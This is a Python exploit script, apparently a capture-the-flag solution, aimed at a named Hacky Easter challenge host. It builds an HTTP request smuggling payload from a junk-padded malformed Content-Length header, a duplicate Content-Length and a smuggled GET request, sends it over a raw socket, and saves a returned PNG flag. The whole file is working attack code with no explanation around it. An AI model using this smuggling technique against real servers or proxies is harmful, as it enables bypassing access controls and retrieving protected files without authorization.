from argparse import ArgumentParser
from socket import *
import re
import time
import pathlib


def prepare_request(host, path):       
    body_scheme = f"GET {path} HTTP/1.1\nDelimiter: GET / HTTP/1.1\nHost: {host}\n\n"
    body_length = len(re.findall(b'^GET.*\n.*Delimiter:.',body_scheme.encode())[0])

    request_scheme = f"""POST HTTP/1.1
    Host: {host}
    Content-Length03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L0:
    Content-Length:{body_length}\n\n{body_scheme}"""
   
    request = request_scheme.encode()
    return request


def exploit(host, path, port):
    with socket(AF_INET, SOCK_STREAM) as sock:  
        try:
            sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
            sock.connect((host, port))         
            sock.sendall( prepare_request(host, path) )         
            print('[.] waiting for reponse ...\n\n')
         
            timeout_start = time.time()
            flag_started = False

            flag = b""

            while True:
                recv = sock.recv(4096)

                f = open(f"{pathlib.Path(__file__).parent}/flag.png", 'ab').write(recv)
            
                if flag_started:
                    flag += recv 
                    print("CONTINUED:")      
                    print(recv)
                    #f = open(f"{pathlib.Path(__file__).parent}/flag.png", 'ab').write(recv)

                if b"\x89PNG" in recv:

                    print("FLAG FOUND:")

                    flag += recv[recv.find(b"\x89PNG"):]
                    print(flag)                
                    flag_started = True
            
                if recv == b'' or time.time() > timeout_start + 5:
                    break
            f = open(f"{pathlib.Path(__file__).parent}/flag.png", 'wb').write(flag)

        except error as e:
            sock.close()
            print('''Connection failed! : "you can change this string with e in source if you want to see whats the problem''')



def main():
    exploit("ch.hackyeaster.com", "/static/flag-55a8408e060a25096eb95be8b86f3a2c66f91193.png", 2406)
   


if __name__ == "__main__":
    main()